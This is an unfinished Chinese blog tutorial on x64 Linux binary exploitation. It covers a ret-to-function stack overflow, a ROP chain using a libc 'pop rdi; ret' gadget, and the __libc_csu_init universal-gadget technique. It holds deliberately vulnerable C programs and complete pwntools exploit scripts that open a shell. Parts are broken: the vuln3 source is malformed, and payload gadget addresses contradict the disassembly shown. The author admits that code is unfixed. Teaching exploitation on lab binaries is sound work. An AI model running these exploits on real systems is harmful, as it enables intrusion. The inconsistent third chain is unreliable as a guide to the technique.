---
layout: post
title: Linux_x64 PWN
excerpt: "64位的pwn"
categories: [未完待续]
comments: true
---
参考: http://pwn4.fun/2016/04/04/Linux-x64-PWN/
#### linux_x64与linux_x86的区别
主要两点：
1. 内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。
2. 参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。

拿一个简单的程序演示：
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void callsystem()
{
    system("/bin/sh");
}

void vulnerable_function()
{
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char **argv)
{
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
    return 0;
}
```
编译
```bash
gcc -fno-stack-protector vuln1.c -o vuln1
chmod +x vuln1
```

使用gdb查看vulnerable_function的指令
```bash
gdb vuln1
gdb-peda$ disass vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00000000004005cd <+0>:	push   rbp
   0x00000000004005ce <+1>:	mov    rbp,rsp
   0x00000000004005d1 <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004005d5 <+8>:	lea    rax,[rbp-0x80]
   0x00000000004005d9 <+12>:	mov    edx,0x200
   0x00000000004005de <+17>:	mov    rsi,rax
   0x00000000004005e1 <+20>:	mov    edi,0x0
   0x00000000004005e6 <+25>:	call   0x4004a0 <read@plt>
   0x00000000004005eb <+30>:	leave  
   0x00000000004005ec <+31>:	ret    
End of assembler dump.
```
由`lea    rax,[rbp-0x80]`可知栈结构如下：


buf 0x80 | 
---|
rbp | 
return address | 

所以要overwrite return address为callsystem()函数的地址，需要136(**0x80+8**)个占位字节+callsystem()的地址。

查看callsystem()的地址
```shell
gdb-peda$ p &callsystem
$1 = (<text variable, no debug info> *) 0x4005bd <callsystem>
gdb-peda$ x/3i 0x4005bd
   0x4005bd <callsystem>:	push   rbp
   0x4005be <callsystem+1>:	mov    rbp,rsp
   0x4005c1 <callsystem+4>:	mov    edi,0x4006c0

```
编写exp
```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

p = process('./vuln1')
callsystem = 0x4005bd
payload = "A" * 136 + p64(callsystem)
p.send(payload)
p.interactive()
```
结果
```bash
python exp.py 
[+] Starting local process './vuln1': pid 7390
[*] Switching to interactive mode
Hello, World
$ id
uid=0(root) gid=0(root) 组=0(root)

```

---

#### 使用工具寻找gadgets
x64的参数会保存在寄存器中，所以需要找一些类似于`pop rdi; ret`这样的gadget，借助工具如ROPgadget查找会更加快捷方便。

再用一个简单的例子演示：
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void systemaddr()
{
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    printf("%p\n", dlsym(handle, "system"));
    fflush(stdout);
}

void vulnerable_function()
{
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char **argv)
{
    systemaddr();
    write(1, "Hello, World\n", 13);
    vulnerable_function();
}
```
编译：`gcc -fno-stack-protector vuln2.c -o vuln2 -ldl`

> 如果你的程序中使用dlopen、dlsym、dlclose、dlerror 显示加载动态库，需要设置链接选项 -ldl

程序会打印system()在内存中的地址，这样就不需要考虑ASLR的问题了，只要想办法执行`system("/bin/sh")`就行。需要找一个将rdi指向”/bin/sh”的gadgets：

从程序中查找指令: `ROPgadget --binary vuln2`

因为程序较小，没有`pop rdi; ret`这个gadgets。可以从libc.so中找，因为程序本身会load libc.so到内存中，并打印system()的地址，所以找到gadgets后可以通过system()计算出libc.so在内存中的基址，从而得到gadgets在内存中的实际地址。

查看调用的动态库：`ldd vuln2`
```
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	libdl.so.2 => /lib64/libdl.so.2 (0x00007ffff7bd7000)
	libc.so.6 => /lib64/libc.so.6 (0x00007ffff7809000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7ddb000)

```
查找libc中的`pop rdi ; ret`
```
ROPgadget --binary /lib64/libc.so.6 --only "pop|ret" | grep rdi
0x000000000001fcf0 : pop rdi ; pop rbp ; ret
0x0000000000022bf8 : pop rdi ; ret
```
我们需要构造的payload结构如下
```
payload = "\x00" * 136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
```
因为我们只需要调用一次system()函数就可以获取shell，所以可以搜索不带ret的gadgets：
```
ROPgadget --binary /lib64/libc.so.6 --only "pop|call" | grep rdi
0x000000000018f783 : call qword ptr [rbp + rdi*4]
0x0000000000184ab7 : call qword ptr [rdi]
0x00000000000266db : call rdi
0x00000000000fe889 : pop rax ; pop rdi ; call rax
0x0000000000033cfb : pop rdi ; call 0x8ff83
0x00000000000fe88a : pop rdi ; call rax
```
发现`pop rax ; pop rdi ; call rax`也可以完成目标，将rax赋值system()的地址，rdi赋值为”/bin/sh”的地址：
```
payload = "\x00" * 136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
```
这两个ROP链都可以完成目标，随便选择一个进行攻击即可。
最终的exp:
```
#!/usr/bin/env python
from pwn import *

libc = ELF('/lib64/libc.so.6')
p = process('./vuln2')
system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
base_addr = system_addr - libc.symbols['system']
binsh_addr = base_addr + next(libc.search('/bin/sh'))
pop_ret_addr = base_addr + 0x0000000000022bf8
p.recv()
payload = "\x00" * 136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
p.send(payload)
p.interactive()
```
结果
```
python exp.py 
[*] '/lib64/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './vuln2': pid 8620
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```

---
#### 通用gadgets

程序在编译过程中会加入一些通用的函数来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但初始化过程是相同的，因此针对这些初始化函数，可以提取一些通用的gadgets来用。

```c
/* compile on linux_64 with gcc -o vuln3 vuln3.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()
{
    char buf[128];
    read(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}

int main(int argc, char **argv)
{
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
    return 0;
}
```
编译
```bash
gcc -o vuln3 vuln3.c
```

这个程序只有一个buffer overflow，先要想办法泄露内存信息，找到system()的值，再传递"/bin/sh"到.bss段，最后调用system("/bin/sh")。源程序中使用了write()和read()函数，可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。

在x64下有一些万能的gadgets可以使用。比如用`objdump -d vuln3 -M intel |less`观察一下`__libc_csu_init()`这个函数。程序只要调用了libc.so，就会有这个函数对libc进行初始化。

```bash
00000000004005e0 <__libc_csu_init>:
  4005e0:       41 57                   push   r15
  4005e2:       41 89 ff                mov    r15d,edi
  4005e5:       41 56                   push   r14
  4005e7:       49 89 f6                mov    r14,rsi
  4005ea:       41 55                   push   r13
  4005ec:       49 89 d5                mov    r13,rdx
  4005ef:       41 54                   push   r12
  4005f1:       4c 8d 25 18 08 20 00    lea    r12,[rip+0x200818]        # 600e10 <__frame_dummy_init_array_entry>
  4005f8:       55                      push   rbp
  4005f9:       48 8d 2d 18 08 20 00    lea    rbp,[rip+0x200818]        # 600e18 <__init_array_end>
  400600:       53                      push   rbx
  400601:       4c 29 e5                sub    rbp,r12
  400604:       31 db                   xor    ebx,ebx
  400606:       48 c1 fd 03             sar    rbp,0x3
  40060a:       48 83 ec 08             sub    rsp,0x8
  40060e:       e8 05 fe ff ff          call   400418 <_init>
  400613:       48 85 ed                test   rbp,rbp
  400616:       74 1e                   je     400636 <__libc_csu_init+0x56>
  400618:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  40061f:       00 
  400620:       4c 89 ea                mov    rdx,r13
  400623:       4c 89 f6                mov    rsi,r14
  400626:       44 89 ff                mov    edi,r15d
  400629:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40062d:       48 83 c3 01             add    rbx,0x1
  400631:       48 39 eb                cmp    rbx,rbp
  400634:       75 ea                   jne    400620 <__libc_csu_init+0x40>
  400636:       48 83 c4 08             add    rsp,0x8
  40063a:       5b                      pop    rbx	//为了减小后面利用难度，将rbx取值为0
  40063b:       5d                      pop    rbp	//将rbp取值为1，通过检测，使检验避过。
  40063c:       41 5c                   pop    r12	//这里存放我们最后跳转目标函数地址
  40063e:       41 5d                   pop    r13	//传入第一个参数
  400640:       41 5e                   pop    r14	//第二个参数
  400642:       41 5f                   pop    r15	//第三个参数
  400644:       c3                      ret    
  400645:       90                      nop
  400646:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  40064d:       00 00 00 
```
可以看到利用0x40063a处的代码我们可以控制`rbx`, `rbp`,` r12`, `r13`, `r14`和`r15`的值，随后利用0x400620处的代码，可以将`r15`, `r14`,` r13`的值赋给`rdx`, `rsi`, `edi`。接着调用`call qword ptr [r12+rbx*8]`。只要将`rbx`的值设为0，再构造栈上的数据就可以控制pc去调用相关函数了。

执行完call之后，程序会对rbx+1，然后比较rbp和rbx的值，如果相等就继续执行并ret到想要继续执行的地址。为了让rbp和rbx的值相等，可以将rbp的值设为1，因为之前把rbx设为了0。

先构造payload1，利用write()输出write在内存中的地址。因为gadget是`call qword ptr [r12+rbx*8]`，所以应该使用write.got而不是write.plt的地址(got里存的是地址，plt里存的是指令)。并且为了返回原程序中，重复利用buffer overflow，我们需要再次覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。

```python
# rdi = r13, rsi = r14, rdx = r15
# write(rdi = 1, rsi = write.got, rdx = 4)
payload1 = "\x00" * 136
# pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x400606) + p64(0xdeadbeff) + p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)
# mov rdx,r15; mov rsi,r14; mov edi,r13d; call qword ptr [r12+rbx*8]
payload1 += p64(0x4005f0)
payload1 += "\x00" * 0x38
payload1 += p64(main)
```

exp接收到write()在内存中的地址后，可以计算出system()在内存中的地址。构造payload2，利用read()将system()的地址以及”/bin/sh”写入到.bss段内存中。

```python
# read(rdi = 0, rsi = bss_addr, rdx = 16)
payload2 = "\x00" * 136
payload2 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005f0)
payload2 += "\x00" * 0x38
payload2 += p64(main)
```

.bss段的地址:
```c
$ readelf -S vuln3|less
...skipping...
  [25] .bss              NOBITS           000000000060103c  0000103c
       0000000000000004  0000000000000000  WA       0     0     1
```

最后构造payload3，调用system()函数执行”/bin/sh”。system()的地址保存在了.bss段首地址上，”/bin/sh”的地址保存在了.bss段首地址+8字节上。

```python
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 = "\x00" * 136
payload3 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)
payload3 += p64(0x4005f0)
payload3 += "\x00" * 0x38
payload3 += p64(main)
```
# 代码还没改，需要重新看
最终的pwn代码
```python
#!/usr/bin/env python
from pwn import *
 
elf = ELF('vuln3')
libc = ELF('libc.so.6')
 
p = process('./vuln3')
# p = remote('127.0.0.1', 10001)
 
got_write = elf.got['write']
got_read = elf.got['read']
 
main = 0x400564
 
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00" * 136
# pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += p64(0x4005F0) 
payload1 += "\x00" * 0x38
payload1 += p64(main)
 
p.recvuntil("Hello, World\n")
 
p.send(payload1)
 
write_addr = u64(p.recv(8))
 
base_addr = write_addr - libc.symbols['write']
system_addr = base_addr + libc.symbols['system']
 
bss_addr=0x601028
 
p.recvuntil("Hello, World\n")
 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  "\x00" * 136
payload2 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) 
payload2 += p64(0x4005F0) 
payload2 += "\x00" * 0x38
payload2 += p64(main)
 
p.send(payload2)
sleep(1)
 
p.send(p64(system_addr))
p.send("/bin/sh\0")
 
p.recvuntil("Hello, World\n")
 
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 =  "\x00" * 136
payload3 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)
payload3 += p64(0x4005F0)
payload3 += "\x00" * 0x38
payload3 += p64(main)
 
p.send(payload3)
 
p.interactive()
```

-----

#### 一个简单的通用gadgets例子
漏洞代码
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```
编译
```
gcc -fno-stack-protector -z execstack -o level5 level5.c
```
checksec
```python
python
>>> from pwn import *
>>> print ELF('level5').checksec()
[*] '/root/sploitfun/64/64/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```
在x64下有一些万能的gadgets可以使用。比如用`objdump -d vuln3 -M intel |less`观察一下`__libc_csu_init()`这个函数。程序只要调用了libc.so，就会有这个函数对libc进行初始化。

```bash
00000000004005e0 <__libc_csu_init>:
  4005e0:       41 57                   push   r15
  4005e2:       41 89 ff                mov    r15d,edi
  4005e5:       41 56                   push   r14
  4005e7:       49 89 f6                mov    r14,rsi
  4005ea:       41 55                   push   r13
  4005ec:       49 89 d5                mov    r13,rdx
  4005ef:       41 54                   push   r12
  4005f1:       4c 8d 25 18 08 20 00    lea    r12,[rip+0x200818]        # 600e10 <__frame_dummy_init_array_entry>
  4005f8:       55                      push   rbp
  4005f9:       48 8d 2d 18 08 20 00    lea    rbp,[rip+0x200818]        # 600e18 <__init_array_end>
  400600:       53                      push   rbx
  400601:       4c 29 e5                sub    rbp,r12
  400604:       31 db                   xor    ebx,ebx
  400606:       48 c1 fd 03             sar    rbp,0x3
  40060a:       48 83 ec 08             sub    rsp,0x8
  40060e:       e8 05 fe ff ff          call   400418 <_init>
  400613:       48 85 ed                test   rbp,rbp
  400616:       74 1e                   je     400636 <__libc_csu_init+0x56>
  400618:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  40061f:       00 
  400620:       4c 89 ea                mov    rdx,r13
  400623:       4c 89 f6                mov    rsi,r14
  400626:       44 89 ff                mov    edi,r15d
  400629:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40062d:       48 83 c3 01             add    rbx,0x1
  400631:       48 39 eb                cmp    rbx,rbp
  400634:       75 ea                   jne    400620 <__libc_csu_init+0x40>
  400636:       48 83 c4 08             add    rsp,0x8
  40063a:       5b                      pop    rbx	//为了减小后面利用难度，将rbx取值为0
  40063b:       5d                      pop    rbp	//将rbp取值为1，通过检测，使检验避过。
  40063c:       41 5c                   pop    r12	//这里存放我们最后跳转目标函数地址
  40063e:       41 5d                   pop    r13	//传入第一个参数
  400640:       41 5e                   pop    r14	//第二个参数
  400642:       41 5f                   pop    r15	//第三个参数
  400644:       c3                      ret    
  400645:       90                      nop
  400646:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  40064d:       00 00 00 
```
对上面的汇编代码进行分析，先分析6次pop的地方（我们不妨将6次pop的地址记为pop_6）
```
  40063a:       5b                      pop    rbx	//为了减小后面利用难度，将rbx取值为0
  40063b:       5d                      pop    rbp	//将rbp取值为1，通过检测，使检验避过。
  40063c:       41 5c                   pop    r12	//这里存放我们最后跳转目标函数地址
  40063e:       41 5d                   pop    r13	//传入第三个参数
  400640:       41 5e                   pop    r14	//第二个参数
  400642:       41 5f                   pop    r15	//第一个参数
  400644:       c3                      ret    
```
我们将6次pop中的ret的值设为下面汇编的地址（我们不妨将下面汇编的地址记为mov_3）
```
  400620:       4c 89 ea                mov    rdx,r13	//传给第三个参数
  400623:       4c 89 f6                mov    rsi,r14	//传给第二个参数
  400626:       44 89 ff                mov    edi,r15d	//r15d（r15低32位）给 edi（rdi低32位）
  400629:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40062d:       48 83 c3 01             add    rbx,0x1
  400631:       48 39 eb                cmp    rbx,rbp
  400634:       75 ea                   jne    400620 <__libc_csu_init+0x40>
```
我们将r15的值赋值给rdi,，r14的值赋值给rsi，r13的值赋值给edx，随后就会调用call qword ptr [r12+rbx8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。所以payload为
```
payload = 'a'*0x88+p64(pop_6)
payload+=p64(0)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])+p64(1)
payload+=p64(mov_3)+'a'*(8*7)+p64(main)
```
https://blog.csdn.net/weixin_44681716/article/details/89057022